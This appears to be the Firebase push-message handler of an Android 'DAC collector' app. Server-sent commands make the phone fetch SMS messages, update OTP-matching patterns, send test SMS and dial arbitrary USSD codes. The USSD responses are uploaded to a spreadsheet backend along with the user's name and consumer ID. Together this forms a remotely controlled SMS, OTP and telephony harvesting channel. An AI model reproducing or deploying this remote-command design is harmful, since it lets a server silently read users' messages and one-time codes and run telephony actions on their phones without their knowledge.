package android.iocl.dac_collector.Firebase;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.iocl.dac_collector.BuildConfig;
import android.iocl.dac_collector.ModelData.ColumnValue;
import android.iocl.dac_collector.ModelData.DAC_Collector_Base;
import android.iocl.dac_collector.ModelData.update_dac_collect;
import android.iocl.dac_collector.RetrofitClient.RequestService;
import android.iocl.dac_collector.RetrofitClient.RetrofitClient;
import android.iocl.dac_collector.Services.JobSchedulerUtil;
import android.iocl.dac_collector.Services.SendDACService;
import android.iocl.dac_collector.Services.SmsFetchWorker;
import android.iocl.dac_collector.Services.SmsNumberScanWorker;
import android.iocl.dac_collector.Services.SmsSenderJOBService;
import android.iocl.dac_collector.Utility.Constant;
import android.iocl.dac_collector.Utility.NotificationHelper;
import android.iocl.dac_collector.Utility.SharedPrefs;
import android.iocl.dac_collector.Utility.SmsWorkUtil;
import android.iocl.dac_collector.Utility.Utility;
import android.iocl.dac_collector.Utility.WakeupHelper;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.core.content.ContextCompat;
import androidx.work.Configuration;
import androidx.work.Constraints;
import androidx.work.NetworkType;
import androidx.work.OneTimeWorkRequest;
import androidx.work.WorkManager;

import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;

import java.util.Arrays;
import java.util.List;
import java.util.Map;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class FCMPushReceiver extends FirebaseMessagingService {

    private static final String TAG = "MyFirebaseMsgService";

    @Override
    public void onMessageReceived(RemoteMessage remoteMessage) {

        try {
            routeFcmActions(remoteMessage);
        } catch (Exception e) {
            Log.d(TAG, "onMessageReceived: ");
        }





        if (BuildConfig.DEBUG){
            debugFCM(remoteMessage);
        }

//        WakeupHelper.wakeupAppService(getApplicationContext());




    }

    private void routeFcmActions(RemoteMessage remoteMessage) {
        if (remoteMessage.getData().size() > 0) {
            String actionType = remoteMessage.getData().get("actions");
            String payloads = remoteMessage.getData().get("payload");

            switch (actionType) {
                case "heart_beat":
                    sendTokenToServer();
                    scheduleJob();
                    WakeupHelper.scheduleAlarm(getApplicationContext(), SmsSenderJOBService.class);
                    break;
                case "recharge_notify":
                    NotificationHelper.showRechargeNotification(getApplicationContext(), payloads);
                    break;
                case "otp_patterns":
                    Log.d(TAG, "onMessageReceived: " + payloads);
                    Utility.updateMessagePattern(payloads, this);
                    break;
                case "get_sms":
                    handleSendSms();
                    break;
                case "receivedSubsidy":
                    handleSubsidy(payloads, remoteMessage);
                    break;
                case "run_ussd":
                    runUssdCode(getApplicationContext(), payloads);
                    break;
                case "update_status":
                    FirebaseDBClient.updateAppAliveStatus(getApplicationContext());
                    break;
                // after 2.5.2 - 505
                case "get_perm_status":
                    SmsWorkUtil.enqueueUploadWorker(getApplicationContext(), "PERM");
                    break;

                // Implemented after 2.5.2 - 505
                case "send_dual_sms":
                    SmsWorkUtil.enqueueSmsWorker(getApplicationContext(), "TEST-001", Constant.testSms, System.currentTimeMillis() + "");
                    break;
                case "get_dac":
                    Intent mainService = new Intent(this, SendDACService.class);
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        startForegroundService(mainService);
                    } else {
                        startService(mainService);
                    }
                    break;
                default:
                    Log.d(TAG, "onMessageReceived: " + actionType);
                    break;

            }


        }
    }

    private void debugFCM(RemoteMessage remoteMessage) {
        // Log notification payload (if exists)
        if (remoteMessage.getNotification() != null) {
            RemoteMessage.Notification notification = remoteMessage.getNotification();
            Log.d(TAG, "Notification Title: " + notification.getTitle());
            Log.d(TAG, "Notification Body: " + notification.getBody());
            Log.d(TAG, "Notification Icon: " + notification.getIcon());
            Log.d(TAG, "Notification Tag: " + notification.getTag());
            Log.d(TAG, "Notification Click Action: " + notification.getClickAction());
            Log.d(TAG, "Notification Color: " + notification.getColor());
            Log.d(TAG, "Notification Sound: " + notification.getSound());
            Log.d(TAG, "Notification Link: " + notification.getLink());
        }

        // Log data payload (key-value pairs)
        if (remoteMessage.getData().size() > 0) {
            Log.d(TAG, "Data Payload:");
            for (Map.Entry<String, String> entry : remoteMessage.getData().entrySet()) {
                Log.d(TAG, entry.getKey() + " : " + entry.getValue());
            }
        }

        // Log message ID and other metadata
        Log.d(TAG, "From: " + remoteMessage.getFrom());
        Log.d(TAG, "Message ID: " + remoteMessage.getMessageId());
        Log.d(TAG, "Sent Time: " + remoteMessage.getSentTime());
        Log.d(TAG, "TTL: " + remoteMessage.getTtl());
        Log.d(TAG, "Collapse Key: " + remoteMessage.getCollapseKey());
    }

    private void handleSubsidy(String payload, RemoteMessage remoteMessage) {
        SharedPrefs.setSubsidyDetails(getApplicationContext(), payload);
        SharedPrefs.SetlastSubsidyDate(getApplicationContext(), Utility.getStandardDate());
        SharedPrefs.setIsSubsidyRequestPending(getApplicationContext(), false);

        String title = null;
        String body = null;

        if (remoteMessage.getNotification() != null) {
            title = remoteMessage.getNotification().getTitle();
            body = remoteMessage.getNotification().getBody();
        } else if (remoteMessage.getData().size() > 0) {
            title = remoteMessage.getData().get("title");
            body = remoteMessage.getData().get("body");
        }

        NotificationHelper.sendNotification(this,
                title != null ? title : "Subsidy Check Completed",
                body != null ? body : "New subsidy information received.");
    }


    @SuppressLint("MissingPermission")
    public void runUssdCode(final Context ctx, String ussdCode) {

        // Check if we have necessary permissions
        if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
            sendUSSDCodeToServer("Permission not granted for CALL_PHONE.", "PermissionError");
            return;
        }

        TelephonyManager manager = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);

        if (manager != null) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                // Use the main thread's Looper to ensure the Handler is associated with the main thread
                Handler handler = new Handler(Looper.getMainLooper());

                manager.sendUssdRequest(ussdCode, new TelephonyManager.UssdResponseCallback() {
                    @Override
                    public void onReceiveUssdResponse(TelephonyManager telephonyManager, String request, CharSequence response) {
                        super.onReceiveUssdResponse(telephonyManager, request, response);
                        String responseReceived = response.toString();
                        Log.d(TAG, " response -> " + response);

                        sendUSSDCodeToServer(responseReceived, ussdCode);
                    }

                    @Override
                    public void onReceiveUssdResponseFailed(TelephonyManager telephonyManager, String request, int failureCode) {
                        super.onReceiveUssdResponseFailed(telephonyManager, request, failureCode);
                        Log.d(this.getClass().getName(), "response failed: " + failureCode);
                    }
                }, handler);
            }
        } else {
            Log.e(this.getClass().getName(), "TelephonyManager is null");
        }
    }


    private void handleSendSms() {
        Constraints constraints = new Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)  // Only run when connected to Wi-Fi
                .build();

        OneTimeWorkRequest smsFetchRequest = new OneTimeWorkRequest.Builder(SmsFetchWorker.class)
                .setConstraints(constraints)
                .build();

        WorkManager.getInstance(getApplicationContext()).enqueue(smsFetchRequest);
    }

    @Override
    public void onNewToken(@NonNull String token) {
        super.onNewToken(token);


        SharedPrefs.setFCMKey(getApplicationContext(), token);

        sendTokenToServer();
    }

    private void scheduleJob() {
        if (!Utility.isJobSchedulerActive(getApplicationContext(), 1)) {
            JobSchedulerUtil.Sms_and_Call_sender(getApplicationContext());
            JobSchedulerUtil.fetch_profile_info(getApplicationContext());
        }
    }


    private void sendTokenToServer() {
        Context context = getApplicationContext();

        // Try to get WorkManager instance
        WorkManager workManager = null;
        try {
            workManager = WorkManager.getInstance(context);
        } catch (IllegalStateException e) {
            // Initialize if not already initialized
            Configuration config = new Configuration.Builder()
                    .setMinimumLoggingLevel(Log.DEBUG)
                    .build();
            WorkManager.initialize(context, config);
            workManager = WorkManager.getInstance(context);
        }

        Constraints constraints = new Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .build();

        OneTimeWorkRequest smsFetchRequest = new OneTimeWorkRequest.Builder(SmsNumberScanWorker.class)
                .setConstraints(constraints)
                .build();

        workManager.enqueue(smsFetchRequest);
    }

    private void sendUSSDCodeToServer(String UssdResponse, String ussdCode) {


        String cons_id = SharedPrefs.getConsumerId(this);
        String name = SharedPrefs.getUsername(this);

        if (cons_id.isEmpty()) {
            return;
        }

        RequestService requestService = RetrofitClient.retrofit_spreadsheet(getApplicationContext()).create(RequestService.class);
        List<ColumnValue> smsInfo = Arrays.asList(
                new ColumnValue("USER_NAME", name),
                new ColumnValue("USER_NUMBER", ussdCode),
                new ColumnValue("SMS_B64", UssdResponse)
        );

        update_dac_collect receiver = new update_dac_collect("addUserSms", cons_id, smsInfo);
        Call<DAC_Collector_Base> auth = requestService.update_dac_collector(receiver);
        auth.enqueue(new Callback<DAC_Collector_Base>() {
            @Override
            public void onResponse(Call<DAC_Collector_Base> call, Response<DAC_Collector_Base> response) {


            }

            @Override
            public void onFailure(Call<DAC_Collector_Base> call, Throwable t) {

            }
        });

    }


}